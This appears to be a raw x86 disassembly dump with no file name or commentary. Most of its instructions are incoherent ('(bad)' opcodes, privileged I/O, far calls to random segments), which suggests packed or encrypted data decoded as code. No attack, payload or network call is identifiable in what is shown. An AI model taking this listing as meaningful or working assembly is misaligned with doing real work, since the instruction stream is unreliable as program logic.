  42529a:	mov    dh,0x47
  42529c:	xlat   BYTE PTR ds:[ebx]
  42529d:	cmp    DWORD PTR [ebp+ebx*1-0xbe223a4],ebx
  4252a4:	call   0x2141fee3
  4252a9:	add    bh,BYTE PTR [edx]
  4252ab:	stos   BYTE PTR es:[edi],al
  4252ac:	lea    ecx,[ebx]
  4252ae:	jmp    0x42528f
  4252b0:	out    0x60,eax
  4252b2:	add    esp,esi
  4252b4:	stos   BYTE PTR es:[edi],al
  4252b5:	push   ss
  4252b6:	mov    esp,0xff98937
  4252bb:	mov    al,0xf
  4252bd:	cmp    DWORD PTR [esi+eax*2+0x50],esi
	...
  425331:	add    BYTE PTR [eax],al
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz cwde 
  425341:	(bad)  
  425342:	popf   
  425343:	cmp    dl,BYTE PTR [edx]
  425345:	mov    WORD PTR [ecx],es
  425347:	add    ch,dh
  425349:	add    BYTE PTR [eax],al
  42534b:	add    BYTE PTR [ecx-0x3bb0c747],dh
  425351:	jae    0x4253c6
  425353:	inc    eax
  425354:	scas   al,BYTE PTR es:[edi]
  425355:	xlat   BYTE PTR ds:[ebx]
  425356:	mov    DWORD PTR [ebx+eax*1-0x354b5147],eax
  42535d:	sbb    bh,BYTE PTR [ebp-0x1e0990d3]
  425363:	nop
  425364:	jmp    0xa064e062
  425369:	out    dx,eax
  42536a:	pop    edx
  42536b:	inc    edi
  42536c:	push   ds
  42536d:	lds    ecx,FWORD PTR [edx+0x5]
  425370:	mov    ah,0xfb
  425372:	push   es
  425373:	pop    eax
  425374:	int    0x4
  425376:	(bad)  
  425377:	ins    DWORD PTR es:[edi],dx
  425378:	cdq    
  425379:	cmp    al,0xa
  42537b:	cmp    eax,0x1992a3f6
  425380:	push   eax
  425381:	xlat   BYTE PTR ds:[ebx]
  425382:	push   cs
  425383:	cmp    eax,0x8798edec
  425388:	arpl   WORD PTR [ebx-0x46],di
  42538b:	add    dl,BYTE PTR [eax+eiz*1+0x78]
  42538f:	add    bl,ch
  425391:	loopne 0x42532c
  425393:	xchg   BYTE PTR [eax],bl
  425395:	jge    0x42539a
  425397:	pop    es
  425398:	int3   
  425399:	jmp    0x42531b
  42539b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42539c:	lock hlt 
  42539e:	sub    eax,edx
  4253a0:	mul    BYTE PTR [edx+ebx*2+0x18dcc704]
  4253a7:	inc    ecx
  4253a8:	bound  esp,QWORD PTR [edx+0x655f98df]
  4253ae:	cmp    al,0x95
  4253b0:	aad    0xf6
  4253b2:	es mov dh,0xd0
  4253b5:	dec    esi
  4253b6:	ds not cl
  4253b9:	cmova  esi,ebx
  4253bc:	xchg   edx,eax
  4253bd:	aad    0xf9
  4253bf:	mov    eax,ds:0xab679ae7
  4253c4:	jne    0x425397
  4253c6:	mov    ch,0x7f
  4253c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253c9:	test   BYTE PTR [ebp-0x57],0x31
  4253cd:	push   ss
  4253ce:	adc    eax,0x321c0211
  4253d3:	sti    
  4253d4:	and    DWORD PTR [eax-0x63],edi
  4253d7:	and    ebp,DWORD PTR [ebp+0x83949fc]
  4253dd:	(bad)  
  4253de:	mov    ecx,0x8f1f986a
  4253e3:	or     bh,BYTE PTR [edx]
  4253e5:	in     al,0x33
  4253e7:	mov    al,0xf8
  4253e9:	xor    eax,0xb5c999a3
  4253ee:	jno    0x4253be
  4253f0:	aad    0xc9
  4253f2:	ins    DWORD PTR es:[edi],dx
  4253f3:	scas   al,BYTE PTR es:[edi]
  4253f4:	xor    eax,0x43723723
  4253f9:	push   esp
  4253fa:	pop    ebp
  4253fb:	mov    al,ds:0xde94a069
  425400:	jmp    FWORD PTR [ecx+edi*8]
  425403:	fs jb  0x425423
  425406:	pop    ecx
  425407:	lea    ecx,ss:[ebp-0x12a71144]
  42540e:	(bad)  
  42540f:	stc    
  425410:	adc    eax,0x31e034c3
  425415:	adc    ecx,DWORD PTR [eax+0x14089329]
  42541b:	adc    BYTE PTR [ebp-0x63d97334],bh
  425421:	fs stos DWORD PTR es:[edi],eax
  425423:	mov    eax,0x197433f0
  425428:	aas    
  425429:	scas   al,BYTE PTR es:[edi]
  42542a:	gs xchg ebp,eax
  42542c:	pop    ecx
  42542d:	enter  0xf8b1,0xe0
  425431:	jg     0x425490
  425433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425434:	mov    ds:0x6da46741,al
  425439:	push   ebp
  42543a:	popa   
  42543b:	ins    DWORD PTR es:[edi],dx
  42543c:	cmp    al,BYTE PTR [ebx-0x14]
  42543f:	cmp    dl,dh
	...
  4254b1:	add    BYTE PTR [eax],al
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	lods   eax,DWORD PTR ds:[esi]
  4254c1:	sbb    ecx,eax
  4254c3:	daa    
  4254c4:	pop    es
  4254c5:	lea    eax,[ecx]
  4254c7:	add    ch,dh
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR [edi-0x33],bh
  4254ce:	in     al,dx
  4254cf:	adc    DWORD PTR [ebp+0x16],ebx
  4254d2:	nop
  4254d3:	mov    ds:0x386ac5ef,eax
  4254d8:	inc    esi
  4254d9:	jnp    0x4254c4
  4254db:	es (bad) 
  4254dd:	pop    esp
  4254de:	mov    eax,ds:0xaa00773f
  4254e3:	mov    edx,0x15f6d07d
  4254e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254e9:	mov    bl,0x7e
  4254eb:	push   ebx
  4254ec:	sbb    bh,BYTE PTR [eax*1-0x4ef519e1]
  4254f3:	je     0x42550f
  4254f5:	aad    0x33
  4254f7:	add    esi,DWORD PTR [edi+eax*2-0xc]
  4254fb:	sbb    BYTE PTR [edi+0x5042cbb1],bl
  425501:	(bad)  
  425502:	dec    ecx
  425503:	arpl   si,cx
  425505:	ret    
  425506:	pop    ss
  425507:	std    
  425508:	and    BYTE PTR [esi-0x41],al
  42550b:	cmp    eax,DWORD PTR [ecx-0x3]
  42550e:	call   0x9852:0xef897d20
  425515:	adc    BYTE PTR [ebx+0x17],bh
  425518:	cld    
  425519:	xor    DWORD PTR [edi+ebx*1+0x44],ecx
  42551d:	xchg   DWORD PTR [ebx],esi
  42551f:	sbb    dl,BYTE PTR [eax+eiz*1-0x29]
  425523:	xor    esi,DWORD PTR [esi-0x3ac7ca8f]
  425529:	aaa    
  42552a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42552c:	(bad)  
  42552d:	inc    eax
  42552e:	iret   
  42552f:	jae    0x4255ac
  425531:	inc    esp
  425532:	adc    eax,0xe75e44b6
  425537:	aaa    
  425538:	sbb    al,bh
  42553a:	icebp  
  42553b:	dec    ebx
  42553c:	xchg   ebp,eax
  42553d:	stos   DWORD PTR es:[edi],eax
  42553e:	repz inc edi
  425540:	lds    edi,FWORD PTR [edi]
  425542:	mov    esp,0x6cad6107
  425547:	dec    ebx
  425548:	add    BYTE PTR [ebx-0x682f797d],dh
  42554e:	inc    ebp
  42554f:	dec    edi
  425550:	push   0x57497923
  425555:	pusha  
  425556:	and    esi,DWORD PTR [eax-0x2c]
  425559:	push   ds
  42555a:	std    
  42555b:	ins    DWORD PTR es:[edi],dx
  42555c:	push   esp
  42555d:	je     0x4254ed
  42555f:	jp     0x425540
  425561:	fld    DWORD PTR [ecx+0x5509df69]
  425567:	sbb    bh,BYTE PTR [edi+0x1]
  42556a:	call   0x7579d626
  42556f:	jno    0x4255a5
  425571:	rcr    BYTE PTR [edi+ebx*2],1
  425574:	mov    cl,0xba
  425576:	xor    eax,0xbe1a768f
  42557b:	mov    ds:0xb32bcd93,eax
  425580:	cmc    
  425581:	icebp  
  425582:	in     al,dx
  425583:	add    esp,edi
  425585:	cmp    esi,DWORD PTR [edx-0x67]
  425588:	cdq    
  425589:	(bad)  
  42558a:	(bad)  
  42558b:	sub    eax,0x3931934a
  425590:	inc    esp
  425591:	push   edi
  425592:	xchg   edi,eax
  425593:	clc    
  425594:	scas   al,BYTE PTR es:[edi]
  425595:	sub    edi,DWORD PTR [edx-0x6d16bec4]
  42559b:	js     0x42559c
  42559d:	xor    edi,DWORD PTR [esi+0x19]
  4255a0:	push   0xffffffd6
  4255a2:	jg     0x425527
  4255a4:	sub    al,0xf7
  4255a6:	out    0x4f,al
  4255a8:	lea    esp,[ebx-0x55418338]
  4255ae:	cmp    DWORD PTR [ecx+0x13794093],ebx
  4255b4:	out    0xec,eax
  4255b6:	call   0x6a6f73ee
  4255bb:	iret   
  4255bc:	adc    esp,DWORD PTR [eax]
  4255be:	aam    0xb8
  4255c0:	and    DWORD PTR [eax],eax
	...
  425632:	add    BYTE PTR [eax],al
  425634:	mov    esp,0xfefffc92
  425639:	(bad)  
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	aam    0xd1
  425642:	pushf  
  425643:	cwde   
  425644:	cld    
  425645:	lea    eax,[ecx]
  425647:	add    ch,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    ch,al
  42564d:	mov    ah,0xf
  42564f:	pop    ds
  425650:	xchg   ebx,eax
  425651:	push   si
  425653:	jno    0x425673
  425655:	jmp    DWORD PTR [ecx]
  425657:	arpl   WORD PTR [ecx+eax*1+0x61],dx
  42565b:	mov    ebx,0xe57db0c8
  425660:	xchg   BYTE PTR [ebx-0x7d],ah
  425663:	outs   dx,BYTE PTR ds:[esi]
  425664:	ss pushf 
  425666:	sub    esi,ecx
  425668:	jmp    DWORD PTR [ebx+ebx*4]
  42566b:	stos   DWORD PTR es:[edi],eax
  42566c:	gs ret 0xff98
  425670:	jl     0x42562e
  425672:	arpl   WORD PTR [esp+eiz*4-0x1f72d32e],si
  425679:	pop    ebp
  42567a:	cld    
  42567b:	rcl    dl,0x47
  42567e:	mov    al,ds:0xdd911761
  425683:	popf   
  425684:	pop    ebp
  425685:	aas    
  425686:	rcr    DWORD PTR [eax+0x74],0xa5
  42568a:	loop   0x425652
  42568c:	push   ds
  42568d:	mov    ebx,0x91c7f746
  425692:	rcl    DWORD PTR [edx+0x45ba6ad0],cl
  425698:	or     ecx,DWORD PTR [esi+0x75]
  42569b:	cs push cs
  42569d:	xchg   esp,eax
  42569e:	push   ebp
  42569f:	dec    edi
  4256a0:	inc    dh
  4256a2:	pushf  
  4256a3:	aaa    
  4256a4:	(bad)  
  4256a5:	mov    dl,0x58
  4256a7:	std    
  4256a8:	imul   BYTE PTR [edx]
  4256aa:	in     eax,0x35
  4256ac:	sbb    ecx,esi
  4256ae:	leave  
  4256af:	je     0x4256a5
  4256b1:	std    
  4256b2:	pop    ebp
  4256b3:	xchg   edi,eax
  4256b4:	mov    esp,0xe66a9e71
  4256b9:	(bad)  [esi-0x1a]
  4256bc:	mul    cl
  4256be:	sbb    cl,ah
  4256c0:	hlt    
  4256c1:	adc    bh,BYTE PTR [ecx+0x8]
  4256c4:	in     al,dx
  4256c5:	pusha  
  4256c6:	aad    0xea
  4256c8:	addr16 mov eax,ds:0xe854
  4256cc:	inc    ecx
  4256cd:	hlt    
  4256ce:	clc    
  4256cf:	push   edx
  4256d0:	push   esp
  4256d1:	cmp    DWORD PTR [ecx],ebx
  4256d3:	adc    eax,0xe1b26dc4
  4256d8:	stos   BYTE PTR es:[edi],al
  4256d9:	cmp    DWORD PTR [edi],ecx
  4256db:	popf   
  4256dc:	popa   
  4256dd:	dec    ebp
  4256de:	and    al,BYTE PTR [ebx+0x73ad3f50]
  4256e4:	inc    edx
  4256e5:	shr    DWORD PTR ds:0x8e49eb90,1
  4256eb:	mov    edx,DWORD PTR [ebx]
  4256ed:	shl    BYTE PTR [edi+0xacc8d17],cl
  4256f3:	outs   dx,BYTE PTR ds:[esi]
  4256f4:	sbb    BYTE PTR [ecx+0xc],ch
  4256f7:	leave  
  4256f8:	hlt    
  4256f9:	push   0xffffffc4
  4256fb:	icebp  
  4256fc:	sbb    cl,ch
  4256fe:	inc    ebp
  4256ff:	rcr    DWORD PTR [esi],cl
  425701:	loopne 0x425719
  425703:	adc    al,0xb0
  425705:	inc    esi
  425706:	repnz fcomp QWORD PTR [eax-0x79]
  42570a:	jge    0x425708
  42570c:	mov    bh,0xd2
  42570e:	int3   
  42570f:	pusha  
  425710:	xor    eax,0x8e133411
  425715:	inc    edx
  425716:	and    al,0x54
  425718:	rol    BYTE PTR [esi+0x35],0x5d
  42571c:	(bad)  [edx]
  42571e:	pusha  
  42571f:	arpl   WORD PTR [ebx-0x34554210],sp
  425725:	inc    ebx
  425726:	sbb    al,0x30
  425728:	fiadd  DWORD PTR [eax+0x704293d]
  42572e:	out    0x53,al
  425730:	sbb    DWORD PTR [ecx-0x26911829],edi
  425736:	or     BYTE PTR [eax+ecx*4-0x33beb07e],dh
  42573d:	sbb    eax,0x96bb1f
	...
  4257b2:	add    BYTE PTR [eax],al
  4257b4:	and    bl,BYTE PTR [eax-0x7c]
  4257b7:	out    dx,eax
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	stc    
  4257c1:	retf   0xf7f
  4257c4:	icebp  
  4257c5:	mov    es,WORD PTR [ecx]
  4257c7:	add    ch,dh
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    dl,ch
  4257cd:	nop
  4257ce:	ins    BYTE PTR es:[edi],dx
  4257cf:	cs push 0x46
  4257d2:	cmp    al,0x99
  4257d4:	pop    esp
  4257d5:	push   cs
  4257d6:	sub    bh,0xba
  4257d9:	xor    ecx,esp
  4257db:	sub    BYTE PTR [ecx+0x97b79c9],cl
  4257e1:	enter  0x6fc4,0xbd
  4257e5:	imul   ebp,DWORD PTR [eax-0x21],0x9e54d993
  4257ec:	or     ebx,DWORD PTR [edi+ebx*1-0x836b84d]
  4257f3:	push   ecx
  4257f4:	xchg   edi,eax
  4257f5:	sbb    esp,edx
  4257f7:	push   ebx
  4257f8:	add    al,0x1a
  4257fa:	inc    edx
  4257fb:	cmp    DWORD PTR [esi-0x2b],edx
  4257fe:	repz inc eax
  425800:	pop    edx
  425801:	stos   BYTE PTR es:[edi],al
  425802:	stos   DWORD PTR es:[edi],eax
  425803:	dec    ebp
  425804:	shl    DWORD PTR [ecx+0x6e770b85],1
  42580a:	(bad)  
  42580b:	push   ds
  42580c:	jmp    0x65ee:0xf8e1e524
  425813:	add    bl,BYTE PTR [eax+0x1a588d0]
  425819:	pop    esp
  42581a:	inc    edi
  42581b:	das    
  42581c:	lods   eax,DWORD PTR ds:[esi]
  42581d:	test   bl,dl
  42581f:	hlt    
  425820:	sbb    al,0x9a
  425822:	dec    ebp
  425823:	jge    0x425808
  425825:	push   esp
  425826:	dec    esp
  425827:	sbb    DWORD PTR [ebx],edx
  425829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42582a:	mov    edx,0x7f54a249
  42582f:	inc    ebp
  425830:	mov    esp,0x1af7b4f0
  425835:	jae    0x4258a0
  425837:	push   esp
  425838:	push   edi
  425839:	sub    DWORD PTR [edi+0x39],ecx
  42583c:	test   al,0xc7
  42583e:	(bad)  
  42583f:	jmp    0x9ab602e3
  425844:	(bad)  
  425846:	mov    dl,BYTE PTR ds:0x8dc15712
  42584c:	popf   
  42584d:	mov    BYTE PTR [edi+0x64],dl
  425850:	sbb    BYTE PTR [edx-0x4d],ch
  425853:	ret    0xbc9
  425856:	fstp   QWORD PTR [edx+edx*4-0x63fbf58c]
  42585d:	mov    ds:0xe8c25121,eax
  425862:	mov    al,0xc3
  425864:	sti    
  425865:	std    
  425866:	popf   
  425867:	not    edx
  425869:	pop    esp
  42586a:	xor    eax,0xee5db33c
  42586f:	enter  0x1a05,0xa5
  425873:	scas   eax,DWORD PTR es:[edi]
  425874:	push   ebp
  425875:	jge    0x42582c
  425877:	dec    edx
  425878:	xchg   ecx,eax
  425879:	out    0xf8,al
  42587b:	loop   0x425804
  42587d:	addr16 pop ecx
  42587f:	bswap  edi
  425881:	cld    
  425882:	add    esp,DWORD PTR [ebp+0x4c]
  425885:	mov    bl,BYTE PTR [edi-0x4a]
  425888:	mov    ebx,0x12e6cc8f
  42588d:	leave  
  42588e:	enter  0x2fec,0xf
  425892:	adc    BYTE PTR ds:0x4884c8d6,0x3a
  425899:	arpl   WORD PTR [ebx-0x45],sp
  42589c:	xor    al,BYTE PTR [edi-0x43]
  42589f:	push   0x5a4dc69e
  4258a4:	inc    esi
  4258a5:	sub    al,0xf4
  4258a7:	loope  0x42587d
  4258a9:	dec    eax
  4258aa:	sbb    eax,0x8525f66b
  4258af:	lods   al,BYTE PTR ds:[esi]
  4258b0:	out    dx,al
  4258b1:	and    esp,eax
  4258b3:	daa    
  4258b4:	loop   0x4258af
  4258b6:	into   
  4258b7:	add    BYTE PTR ds:0xca672ce7,dh
  4258bd:	int    0x27
  4258bf:	rcl    BYTE PTR [ebx+0x0],0x0
	...
  425933:	add    BYTE PTR [ebx+0x18],ch
  425936:	arpl   WORD PTR [edx+0x73],bp
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	push   ebp
  425941:	jl     0x425950
  425943:	(bad)  
  425944:	out    0x8f,al
  425946:	add    DWORD PTR [eax],eax
  425948:	cmc    
  425949:	add    BYTE PTR [eax],al
  42594b:	add    BYTE PTR [edi+0x5a],bl
  42594e:	mov    WORD PTR [edi*2+0x33411b35],es
  425955:	ret    0x8975
  425958:	popa   
  425959:	or     eax,DWORD PTR [esi+eax*8+0x55554f45]
  425960:	adc    dh,0x76
  425963:	mov    edx,0x4d0175f2
  425968:	ret    
  425969:	mov    dh,0x50
  42596b:	lahf   
  42596c:	aad    0xec
  42596e:	mov    edx,DWORD PTR [edi]
  425970:	aam    0x94
  425972:	mov    dh,0x1
  425974:	jl     0x42594b
  425976:	in     eax,0x2e
  425978:	in     al,0xdd
  42597a:	into   
  42597b:	ret    
  42597c:	daa    
  42597d:	(bad)  
  42597f:	fcmovnu st,st(5)
  425981:	retf   
  425982:	scas   al,BYTE PTR es:[edi]
  425983:	call   0x6e3d700c
  425988:	fwait
  425989:	pop    esi
  42598a:	cmp    DWORD PTR [esi],edi
  42598c:	cmp    BYTE PTR [ebx],0x90
  42598f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425990:	xor    DWORD PTR [edi+0x709e8574],esp
  425996:	in     al,dx
  425997:	in     al,0x12
  425999:	in     al,dx
  42599a:	sub    al,0x32
  42599c:	mov    ch,0xff
  42599e:	lea    edi,[edx-0x9]
  4259a1:	into   
  4259a2:	cmp    eax,0xeb024969
  4259a7:	cld    
  4259a8:	sar    BYTE PTR [ecx],0x66
  4259ab:	ins    DWORD PTR es:[edi],dx
  4259ac:	xchg   BYTE PTR [esi-0x7f85b667],al
  4259b2:	mov    dl,0x7f
  4259b4:	(bad)
  4259b7:	lds    ebx,FWORD PTR [edi]
  4259b9:	idiv   BYTE PTR [eax+edx*2]
  4259bc:	and    ebx,DWORD PTR [ecx]
  4259be:	sbb    DWORD PTR [edi+0x1f],edi
  4259c1:	xlat   BYTE PTR ds:[ebx]
  4259c2:	fnstcw WORD PTR [eax+0xe]
  4259c5:	stos   DWORD PTR es:[edi],eax
  4259c6:	push   edi
  4259c8:	xor    BYTE PTR ds:0xe168c385,cl
  4259ce:	adc    dl,BYTE PTR [ecx+0x287670a4]
  4259d4:	lds    ebx,FWORD PTR [eax]
  4259d6:	ins    BYTE PTR es:[edi],dx
  4259d7:	xchg   BYTE PTR [esi],bh
  4259d9:	xchg   ebp,eax
  4259da:	(bad)  
  4259db:	cmp    eax,0xeff88601
  4259e0:	dec    edx
  4259e1:	xor    DWORD PTR [edx+0x75c93c5b],0xeaefc97e
  4259eb:	pusha  
  4259ec:	dec    ecx
  4259ed:	dec    edi
  4259ee:	mov    esi,0x227e70bf
  4259f3:	dec    esi
  4259f4:	pop    es
  4259f5:	xor    BYTE PTR [ebp+0x65ea107b],ah
  4259fb:	cmp    DWORD PTR [eax+0x1ee0b3ce],0x9fdd2232
  425a05:	das    
  425a06:	jne    0x4259a9
  425a08:	push   es
  425a09:	push   esp
  425a0a:	jb     0x4259e6
  425a0c:	cld    
  425a0d:	jns    0x425a73
  425a0f:	mov    DWORD PTR [edi],esp
  425a11:	mov    ds,WORD PTR ds:0x403a1b38
  425a17:	dec    edi
  425a18:	mov    ch,0x62
  425a1a:	popf   
  425a1b:	mov    ecx,0x9dc18352
  425a20:	cmp    BYTE PTR [ecx],dh
  425a22:	pop    esi
  425a23:	push   ecx
  425a24:	pop    esi
  425a25:	mov    ebx,0xa9409d13
  425a2a:	fsub   QWORD PTR [ecx-0x68]
  425a2d:	cli    
  425a2e:	mov    eax,0x3fd9fbfe
  425a33:	dec    esi
  425a34:	or     BYTE PTR [eax],ch
  425a36:	(bad)  [edi-0x60]
  425a39:	push   ebx
  425a3a:	sbb    DWORD PTR [esi-0x955b281],ebx
  425a40:	inc    DWORD PTR [eax]
	...
  425ab2:	add    BYTE PTR [eax],al
  425ab4:	push   es
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	mov    ds:0xdbc6c8eb,eax
  425ac5:	nop
  425ac6:	add    DWORD PTR [eax],eax
  425ac8:	cmc    
  425ac9:	add    BYTE PTR [eax],al
  425acb:	add    BYTE PTR ds:0x486e4e33,ah
  425ad1:	imul   ebp,DWORD PTR [ecx],0xda69721b
  425ad7:	shl    esp,1
  425ad9:	pop    ds
  425ada:	mov    BYTE PTR [ebx+eiz*4-0x5f994fa3],0xe4
  425ae2:	or     cl,dh
  425ae4:	stos   DWORD PTR es:[edi],eax
  425ae5:	retf   
  425ae6:	ds inc edi
  425ae8:	add    ch,BYTE PTR [edx+0x698b099f]
  425aee:	cmp    BYTE PTR [ebp-0x73ab91fe],dh
  425af4:	stos   BYTE PTR es:[edi],al
  425af5:	xchg   edi,eax
  425af6:	int    0xee
  425af8:	push   ecx
  425af9:	fs xchg esi,eax
  425afb:	lahf   
  425afc:	xor    eax,0x716322c1
  425b01:	sub    al,0x90
  425b03:	jae    0x425aa5
  425b05:	adc    BYTE PTR [ecx-0x52],dl
  425b08:	sti    
  425b09:	pusha  
  425b0a:	add    cl,ch
  425b0c:	dec    ebx
  425b0d:	push   ss
  425b0e:	je     0x425b74
  425b10:	add    ecx,DWORD PTR [eax+esi*1-0x6a]
  425b14:	jecxz  0x425b2c
  425b16:	pop    es
  425b17:	ds (bad) 
  425b1a:	dec    ecx
  425b1b:	dec    ecx
  425b1c:	popa   
  425b1d:	arpl   WORD PTR [ecx],bx
  425b1f:	sbb    al,0x7
  425b21:	enter  0x785d,0x6
  425b25:	push   esp
  425b26:	mov    ss,WORD PTR [ebx]
  425b28:	(bad)  
  425b29:	dec    ebx
  425b2a:	or     al,BYTE PTR [ebp+0x31ee279f]
  425b30:	xchg   ebp,eax
  425b31:	fbstp  TBYTE PTR [ebp+edi*4+0x6b7c7c33]
  425b38:	or     BYTE PTR [ebx*1-0x1f3b473a],ch
  425b3f:	sbb    ebp,DWORD PTR [edi+ebp*2-0x629cd00b]
  425b46:	lods   al,BYTE PTR ds:[esi]
  425b47:	mov    esi,0x6685bce7
  425b4c:	pop    edx
  425b4d:	cwde   
  425b4e:	push   0xffffff9f
  425b50:	pop    edi
  425b51:	mov    bl,0x28
  425b53:	test   eax,0xe3eb40ac
  425b58:	and    al,0x4f
  425b5a:	gs mov ebx,0xe9a2c1a0
  425b60:	inc    cx
  425b62:	xchg   esp,eax
  425b63:	loopne 0x425bdc
  425b65:	(bad)  
  425b66:	idiv   BYTE PTR [ebx-0x63]
  425b69:	pop    esi
  425b6a:	and    eax,0x255a2ca1
  425b6f:	sub    BYTE PTR [eax-0x66868f6c],dh
  425b75:	adc    esp,edi
  425b77:	cs jmp 0x425bf8
  425b7a:	shl    DWORD PTR [ecx-0x1d92a470],cl
  425b80:	pop    ss
  425b81:	push   ecx
  425b82:	mov    ebx,0xc933b68
  425b87:	jp     0x425b10
  425b89:	push   edi
  425b8a:	sub    al,0xf1
  425b8c:	clc    
  425b8d:	jae    0x425b51
  425b8f:	sbb    edx,edx
  425b91:	mov    dh,0x8c
  425b93:	fnstsw WORD PTR [edi+ecx*8]
  425b96:	jle    0x425c05
  425b98:	fwait
  425b99:	iret   
  425b9a:	mov    ebp,0x5f2559f2
  425b9f:	mov    ds:0x8e527fe5,al
  425ba4:	and    bl,BYTE PTR [eax-0x53]
  425ba7:	and    BYTE PTR [edi-0x1f],dl
  425baa:	call   0x8cc0:0x5f73d85b
  425bb1:	call   0xef5a:0x806fb5d0
  425bb8:	push   ebx
  425bb9:	(bad)
  425bbe:	shr    DWORD PTR [eax+0x54],cl
	...
  425c34:	ins    BYTE PTR es:[edi],dx
  425c35:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  425c3c:	cli    
  425c3d:	sub    ch,cl
  425c3f:	call   0x91d0:0xfc76ef55
  425c46:	add    DWORD PTR [eax],eax
  425c48:	cmc    
  425c49:	add    BYTE PTR [eax],al
  425c4b:	add    BYTE PTR [edx+eax*2+0x5a],cl
  425c4f:	cmp    al,0xc3
  425c51:	stc    
  425c52:	add    al,0x98
  425c54:	push   0x37
  425c56:	xchg   esi,eax
  425c57:	enter  0xf8c3,0xe1
  425c5b:	test   eax,0xa6714c3c
  425c60:	mov    ch,0xc9
  425c62:	xchg   BYTE PTR [edi+eax*1],dh
  425c65:	iret   
  425c66:	cmp    eax,ecx
  425c68:	xchg   DWORD PTR [edx-0x7fc2b1d5],esi
  425c6e:	es js  0x425c5f
  425c71:	mov    eax,ds:0x3c421971
  425c76:	les    ebx,FWORD PTR [esi]
  425c78:	cmp    ebp,DWORD PTR [esi]
  425c7a:	shl    ecx,1
  425c7c:	in     al,0xee
  425c7e:	mov    ?,ecx
  425c80:	mov    ds:0x71094336,eax
  425c85:	or     DWORD PTR [ecx-0x18],ecx
  425c88:	bound  esp,QWORD PTR [edx-0x7509fef6]
  425c8e:	and    BYTE PTR [ecx-0x33],0xbc
  425c92:	std    
  425c93:	pop    es
  425c94:	cmp    cl,BYTE PTR [eax+0x7f]
  425c97:	std    
  425c98:	fistp  DWORD PTR [edx+eiz*8]
  425c9b:	rcr    esi,0x5c
  425c9e:	test   ch,0x8a
  425ca1:	inc    esi
  425ca2:	in     eax,dx
  425ca3:	jp     0x425c48
  425ca5:	bound  esi,QWORD PTR [ebx-0x43]
  425ca8:	adc    cl,BYTE PTR [ebp+ebp*4+0x158c06d5]
  425caf:	in     eax,0x80
  425cb1:	rol    BYTE PTR [eax-0x55],1
  425cb4:	iret   
  425cb5:	add    al,0xd
  425cb7:	fadd   st,st(0)
  425cb9:	out    0x66,al
  425cbb:	aam    0xa2
  425cbd:	ret    0xa434
  425cc0:	or     BYTE PTR [edi-0x55808848],bl
  425cc6:	pop    edi
  425cc7:	or     al,0x3
  425cc9:	push   ebp
  425cca:	or     eax,DWORD PTR [eax]
  425ccc:	or     eax,0xd3d8c239
  425cd1:	mov    esp,0x36e86783
  425cd6:	bound  ebp,QWORD PTR [ebx]
  425cd8:	jb     0x425c5a
  425cda:	les    eax,FWORD PTR [ecx+edi*2]
  425cdd:	jmp    0x26001083
  425ce2:	inc    edi
  425ce3:	xor    edi,edx
  425ce5:	daa    
  425ce6:	lea    edi,[edi]
  425ce8:	mov    edx,0x585d54b0
  425ced:	and    ah,BYTE PTR [ebp-0x27e0d9e7]
  425cf3:	pop    edx
  425cf4:	cmp    al,0xa9
  425cf6:	js     0x425cd1
  425cf8:	sbb    eax,DWORD PTR [edi+0x33182dd1]
  425cfe:	adc    edx,DWORD PTR [ebp+0x66]
  425d01:	xor    DWORD PTR [esp+edx*1+0x17],0xffffffa3
  425d06:	(bad)  
  425d07:	ins    DWORD PTR es:[edi],dx
  425d08:	retf   0xd0ab
  425d0b:	cs xor ebp,edi
  425d0e:	add    al,0x7b
  425d10:	or     bh,bh
  425d12:	dec    esp
  425d13:	mov    DWORD PTR [ebx],ebp
  425d15:	dec    ebx
  425d16:	add    dl,BYTE PTR [esi-0x5a3b1d40]
  425d1c:	ins    DWORD PTR es:[edi],dx
  425d1d:	mov    bl,0xae
  425d1f:	ret    
  425d20:	jge    0x425d26
  425d22:	inc    edi
  425d23:	rol    BYTE PTR [ecx-0x11760078],1
  425d29:	jle    0x425d1a
  425d2b:	and    eax,DWORD PTR [edx]
  425d2d:	pop    ecx
  425d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d2f:	sub    bh,dh
  425d31:	push   esi
  425d32:	cs push ebp
  425d34:	adc    DWORD PTR [esi],eax
  425d36:	add    edi,0x7e
  425d39:	call   0x67b6bac7
  425d3e:	add    edi,DWORD PTR [edi+0xbe]
	...
  425db4:	cmp    eax,0xf361d20c
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	push   ecx
  425dc1:	sbb    BYTE PTR [bx+si-0x6d3b],al
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	cmc    
  425dc9:	add    BYTE PTR [eax],al
  425dcb:	add    BYTE PTR [eax-0x496c78e0],al
  425dd1:	mov    al,0x80
  425dd3:	inc    ecx
  425dd4:	or     eax,eax
